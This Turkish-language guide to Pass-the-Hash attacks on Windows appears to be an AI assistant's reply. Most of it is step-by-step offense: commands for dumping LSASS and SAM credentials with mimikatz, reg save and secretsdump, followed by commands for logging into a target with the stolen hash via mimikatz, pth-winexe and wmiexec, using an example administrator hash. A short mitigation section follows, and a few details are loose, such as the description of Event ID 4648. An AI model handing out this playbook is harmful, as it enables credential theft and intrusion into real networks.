### Pass-the-Hash (PtH) Saldırıları: Detaylı Teknik Rehber

#### **1. Pass-the-Hash Nedir?**
Pass-the-Hash saldırısı, bir kullanıcının kimlik doğrulama bilgilerini (parola yerine, parola hash’i) kullanarak hedef sistemlere erişim sağlama yöntemidir. Bu saldırı, özellikle Windows sistemlerinde yaygındır ve NTLM kimlik doğrulama protokolündeki güvenlik açıklarından yararlanır.

---

#### **2. Saldırı Ön Koşulları**
1. **Hash Elde Etme**: Saldırganın hedef kullanıcının NTLM hash’ini ele geçirmesi gerekir.
   - Hash, genellikle aşağıdaki yöntemlerle elde edilir:
     - **LSASS İşleminden Dump Alma**: `mimikatz`, `procdump`, veya benzeri araçlarla.
     - **SAM Dump**: `secretsdump.py` veya `reg save` gibi araçlarla.
     - **Network Sniffing**: NTLMv2 hash’lerini SMB relay saldırılarıyla yakalama.
2. **Yerel veya Uzaktan Erişim**: Saldırgan, hash’i test edeceği bir sisteme erişebilmelidir.
3. **Hedef Sistemin NTLM Kullanıyor Olması**: Sistem, NTLM tabanlı kimlik doğrulamayı etkinleştirmiş olmalıdır.

---

#### **3. NTLM ve Hash Yapıları**
- NTLM hash'leri iki temel bileşenden oluşur:
  - **LM Hash**: Eski ve zayıf bir hash formatıdır (modern sistemlerde genellikle devre dışıdır).
  - **NT Hash**: Kullanıcı şifresinin MD4 ile hash'lenmiş halidir.
  
Örnek NT Hash:
```
aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

---

#### **4. Saldırı Adımları**
##### **4.1 Hash Elde Etme**
1. **Mimikatz Kullanımı**:
   - `privilege::debug` komutuyla gerekli izinleri alın.
   - `sekurlsa::logonpasswords` veya `sekurlsa::msv` komutları ile NTLM hash'lerini çıkarın.
2. **SAM Dosyasını Dump Etme**:
   - `reg save HKLM\SAM sam.save`
   - `reg save HKLM\SYSTEM system.save`
   - `secretsdump.py -sam sam.save -system system.save` komutları ile hash çıkarma.
3. **Network üzerinden Hash Yakalama**:
   - Responder veya NTLM Relay araçlarını kullanarak SMB veya LDAP üzerinden hash yakalama.

---

##### **4.2 Hash’i Kullanarak Yetkisiz Erişim**
Hash’i hedef sistemde aşağıdaki araçlarla kullanabilirsiniz:
- **Mimikatz ile PtH**:
  - Komut:
    ```
    sekurlsa::pth /user:Administrator /domain:target.domain /ntlm:<hash> /run:cmd.exe
    ```
- **Impacket araçlarıyla PtH**:
  - `pth-smbclient`:
    ```
    pth-smbclient -U <username> -H <hash> //<target-ip>/C$
    ```
  - `wmiexec.py`:
    ```
    wmiexec.py <domain>/<username>@<target-ip> -hashes <LM:NT>
    ```

---

#### **5. Örnek Senaryo**
- **Hedef**: Domain ortamındaki bir Windows Server (192.168.1.10).
- **Elde Edilen Hash**:
  ```
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
  ```

**Adımlar**:
1. **Hash Kullanarak Sistem Erişimi**:
   ```
   pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c //192.168.1.10 cmd.exe
   ```

2. **File Share Erişimi**:
   ```
   smbclient -U Administrator -H <hash> //<target-ip>/C$
   ```

3. **Komut Çalıştırma (WMI veya SMB)**:
   ```
   wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.1.10
   ```

---

#### **6. Güvenlik Önlemleri**
1. **Hash'lerin Ele Geçirilmesini Engelleyin**:
   - LSASS erişimini kısıtlayın (Credential Guard kullanımı).
   - NTLM kimlik doğrulamasını sınırlandırın.
   - Güçlü parolalar kullanarak brute-force saldırılarını zorlaştırın.
2. **NTLMv1'i Devre Dışı Bırakın**:
   - Sadece NTLMv2 kullanımını zorunlu kılın.
3. **Lokal Admin Hesaplarını İzole Edin**:
   - `LAPS` (Local Administrator Password Solution) kullanarak her sistemde farklı admin şifreleri oluşturun.
4. **Şüpheli Aktiviteleri İzleyin**:
   - Event ID 4624 (NTLM login denemeleri) ve 4648 (şifre hash ile giriş) aktivitelerini izleyin.
5. **Least Privilege**:
   - Kullanıcıların gereksiz admin yetkilerini kaldırın.

---

#### **7. İleri Teknikler**
- **Silver Ticket Saldırıları**:
  NTLM hash yerine Kerberos TGS hash’i kullanarak daha güçlü bir erişim elde etme.
- **Golden Ticket Saldırıları**:
  Domain Controller'dan elde edilen hash ile tüm domain kontrolünü ele geçirme.

---

#### **8. Araçlar ve Kullanım**
| Araç           | Açıklama                           |
|-----------------|------------------------------------|
| Mimikatz        | LSASS’tan hash çıkarma            |
| Impacket        | PtH saldırıları için birçok araç  |
| Responder       | Hash sniffing için kullanılır     |
| CrackMapExec    | PtH saldırıları ve lateral hareket|
| WinRM           | Windows uzaktan yönetim          |

Bu rehber ile, Pass-the-Hash saldırısının temellerinden ileri düzey kullanımına kadar detaylı bilgiler sundum. Daha fazla yardım için belirtiniz. 😊
